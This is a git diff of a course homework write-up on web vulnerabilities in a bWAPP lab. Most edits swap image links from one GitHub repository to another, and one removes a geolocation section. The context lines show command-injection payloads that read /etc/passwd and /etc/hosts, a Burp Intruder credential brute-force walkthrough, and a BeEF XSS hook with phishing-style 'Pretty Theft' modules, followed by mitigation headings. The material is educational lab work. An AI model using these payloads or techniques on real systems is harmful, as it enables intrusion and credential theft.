@@ -26,12 +26,12 @@ Using the dot-dot-slash `../` method five times to design two payloads that will
 - `/etc/passwd`
 
 	`8.8.8.8 && cat ../../../../../etc/passwd`
-![cat ../../../../../etc/passwd](https://github.com/zwang21/Week-15-Homework/blob/main/images/passwd.png "cat ../../../../../etc/passwd")
+![cat ../../../../../etc/passwd](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/passwd.png "cat ../../../../../etc/passwd")
 
 - `/etc/hosts`
 
 	`8.8.8.8 && cat ../../../../../etc/hosts`
-![cat ../../../../../etc/hosts](https://github.com/zwang21/Week-15-Homework/blob/main/images/hosts.png "cat ../../../../../etc/hosts")
+![cat ../../../../../etc/hosts](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/hosts.png "cat ../../../../../etc/hosts")
 
 **Recommended mitigation strategies:**
 
@@ -44,7 +44,7 @@ Using the dot-dot-slash `../` method five times to design two payloads that will
 Run this command `sudo burpsuite` in Vagrant command line.
 
 Open Firefox which was already installed `FoxyProxy` add-on extension in class activities.
-![](https://github.com/zwang21/Week-15-Homework/blob/main/images/bwapp.png)
+![](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/bwapp.png)
 
 In Burpsuite, I got following intercept data:
 
@@ -68,29 +68,29 @@ Upgrade-Insecure-Requests: 1
 login=test-user&password=password&form=submit
 ```
 
-![Proxy Intercept results](https://github.com/zwang21/Week-15-Homework/blob/main/images/intercept.png)
+![Proxy Intercept results](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/intercept.png)
 
 - Send above Proxy intercept results to Intruder. Click `Intruder` tab;
 - Verify `Target`;
 
-![Intruder Target](https://github.com/zwang21/Week-15-Homework/blob/main/images/intruder-target.png)
+![Intruder Target](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/intruder-target.png)
 
 - Setup `Positions`, select attack type `Cluster bomb`; 
 - Configure and add `login` and `password` as positions.
 
-![Intruder Positions](https://github.com/zwang21/Week-15-Homework/blob/main/images/intruder-positions.png) 
+![Intruder Positions](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/intruder-positions.png) 
 
 - Click `Payloads` tab, choose `Payload` type as `Simple list`;
 - Add login user ID from `List of Administrators` file into Payload set 1;
 - Add password from `Breached list of Passwords` file into Payload set 2;
 
-![Intruder Payloads](https://github.com/zwang21/Week-15-Homework/blob/main/images/intruder-payloads.png)
+![Intruder Payloads](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/intruder-payloads.png)
  
 - Click `Start attack`
  
 After analysis of intruder attack results, the login username/password combination of "**`tonystark`**" and "**`I am Iron Man`**" did result in a successful login. The page displays `Successful login! You really are Iron Man :)`.
 
-![Intruder Results](https://github.com/zwang21/Week-15-Homework/blob/main/images/intruder-results.png)
+![Intruder Results](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/intruder-results.png)
 
 Recommended mitigation strategies:
 
@@ -134,27 +134,24 @@ Playload: <script src="http://127.0.0.1:3000/hook.js"></script>
 **Step 4, Inject this payload**
 
 One issue was found: in the message box field, there only has maxlength="50" in original source code, therefore we can not input the whole payload code.
-![](https://github.com/zwang21/Week-15-Homework/blob/main/images/maxlength-50.png)
+![](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/maxlength-50.png)
 
 Solution: Right-clicking on web page and selecting "Inspecting the Element". Change as `maxlength="100"`, or just delete this code limit.
 
-![](https://github.com/zwang21/Week-15-Homework/blob/main/images/maxlength-100.png)
+![](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/maxlength-100.png)
 
 **Step 5, A couple BeEF exploits**
 
 Social Engineering >> Pretty Theft
 
-![Pretty Theft - Facebook](https://github.com/zwang21/Week-15-Homework/blob/main/images/pretty-theft.png)
+![Pretty Theft - Facebook](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/pretty-theft.png)
 
-![Pretty Theft - LinkedIn](https://github.com/zwang21/Week-15-Homework/blob/main/images/pretty-theft-2.png)
+![Pretty Theft - LinkedIn](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/pretty-theft-2.png)
 
 Social Engineering >> Fake Notification Bar
 
-![Fake Notification Bar](https://github.com/zwang21/Week-15-Homework/blob/main/images/fake-notification-bar.png)
+![Fake Notification Bar](https://github.com/rkuruba/Web-Vulnerabilities-and-Hardening/blob/main/images/fake-notification-bar.png)
 
-Host >> Get Geolocation (Third Party)
-
-![Get Geolocation (Third Party)](https://github.com/zwang21/Week-15-Homework/blob/main/images/get-geolocation.png)
 
 #### Recommended mitigation strategies
 
